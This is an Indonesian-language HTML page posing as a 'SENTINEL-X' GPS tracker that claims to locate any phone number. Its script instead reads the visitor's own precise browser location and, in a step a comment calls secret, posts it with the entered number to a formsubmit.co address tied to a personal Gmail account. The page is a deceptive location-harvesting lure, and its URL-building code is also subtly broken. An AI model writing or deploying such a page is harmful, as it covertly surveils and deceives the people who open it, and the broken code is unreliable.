<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SENTINEL-X | GPS TRACKER</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .terminal { border: 1px solid #0f0; padding: 25px; width: 320px; text-align: center; box-shadow: 0 0 20px #0f0; background: #050505; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 85%; margin-bottom: 20px; outline: none; font-size: 16px; }
        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; }
        button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
        #status { font-size: 10px; margin-top: 15px; color: #888; text-align: left; min-height: 40px; }
    </style>
</head>
<body>

    <div class="terminal">
        <h2 style="letter-spacing: 3px;">SENTINEL-X</h2>
        <p>[ SYSTEM ONLINE ]</p>
        <hr color="#003300">
        <p>MASUKKAN NOMOR TARGET:</p>
        
        <input type="text" id="phone" placeholder="08xxxxxxxxxx" required>
        <button type="button" onclick="startTrack()">LACAK SEKARANG</button>
        
        <div id="status">> Menunggu input nomor...</div>
    </div>

    <script>
        function startTrack() {
            const phone = document.getElementById('phone').value;
            const status = document.getElementById('status');
            const email = "hiskiayoel9@gmail.com";

            if (!phone) { alert("Nomor HP wajib diisi!"); return; }

            status.innerText = "> MENGHUBUNGKAN KE SATELIT...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapsUrl = "https://www.google.com" + lat + "," + lon;
                    
                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM DATA...";

                    // Kirim data secara diam-diam (AJAX) agar tidak muncul halaman error
                    fetch("https://formsubmit.co" + email, {
                        method: "POST",
                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                        body: JSON.stringify({
                            Nomor_Target: phone,
                            Link_Google_Maps: mapsUrl,
                            Akurasi: position.coords.accuracy + " meter",
                            _subject: "🎯 SENTINEL-X: LOKASI DITEMUKAN!"
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        status.innerText = "> DATA BERHASIL DISIMPAN KE SERVER.";
                        alert("Pelacakan Selesai! Cek email hiskiayoel9@gmail.com (periksa juga folder Spam/Junk).");
                    })
                    .catch(error => {
                        status.innerText = "> ERROR: GAGAL MENGIRIM DATA.";
                        console.log(error);
                    });
                    
                }, (error) => {
                    alert("ERROR: Target menolak izin lokasi. Gagal melacak.");
                    status.innerText = "> AKSES DITOLAK TARGET.";
                }, { enableHighAccuracy: true });
            } else {
                alert("Browser tidak mendukung GPS.");
            }
        }
    </script>
</body>
</html>
